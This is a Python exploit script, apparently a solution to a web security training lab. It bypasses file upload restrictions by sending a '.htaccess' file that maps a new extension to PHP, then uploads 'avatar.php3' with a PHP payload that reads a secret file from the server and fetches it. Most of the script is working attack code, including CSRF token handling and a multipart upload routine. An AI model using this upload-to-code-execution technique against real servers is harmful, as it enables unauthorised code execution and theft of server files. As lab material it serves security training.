import requests,argparse,urllib3,string,random
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts.
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    parser.add_argument('-cookie','--cookie',
                        dest='cookie',
                        help='your session cookie',
                        required=True)
    return parser.parse_args()

def get_csrf_token(s, url,cookie):
    try:
        r = s.get(url, verify=False, proxies=proxies,cookies=cookie)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {"name": "csrf"})['value']
        return csrf
    except Exception as e:
        print(colored(e,'red'))

def upload_file(s,url,cookie):
    URL1 = url + "/my-account"
    URL2=url+'/my-account/avatar'
    file='.htaccess'
    payload='SetHandler application/x-httpd-php'
    Content_Type='text/plain'

    for _ in range(2):
        csrf_token=get_csrf_token(s=s,url=URL1,cookie=cookie)
        params = {"avatar": (file, payload, Content_Type), 
            "user": "wiener",
            "csrf": csrf_token}
        #  add 16 of letters and numbers  ex : add  YwT8kPQ1pb7j3St2 to ------WebKitFormBoundaryYwT8kPQ1pb7j3St2
        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        m =MultipartEncoder(fields=params, boundary=boundary)
        headers = {'Content-Type': m.content_type}
        try:
            s.post(url=URL2,verify=False,proxies=proxies,data=m,cookies=cookie,headers=headers)
            file='avatar.php3'
            payload="<?php echo file_get_contents('/home/carlos/secret'); ?>"
            Content_Type='application/x-php'
        except Exception as e:
            print(colored(e,'red'))
            
    secret_key=get_secret_key(s=s,url=url,cookie=cookie)
    return secret_key
        

def get_secret_key(s,url,cookie):
    URL=url+'/files/avatars/avatar.php3'
    try:
        res=s.get(url=URL,verify=False,proxies=proxies,cookies=cookie)
        return res.text
    except Exception as e:
        print(colored(e,'red'))

def main():
    banner('information-disclosure')

    url=parsearg().url
    cookie=parsearg().cookie

    cookie={'session':cookie}
    URL=str(url).rstrip('/')
    s=requests.session()

    secret_key=upload_file(s=s,url=URL,cookie=cookie)
    print('secret_key: '+colored(secret_key,'green'))
    
    
if __name__=='__main__':
    main()
    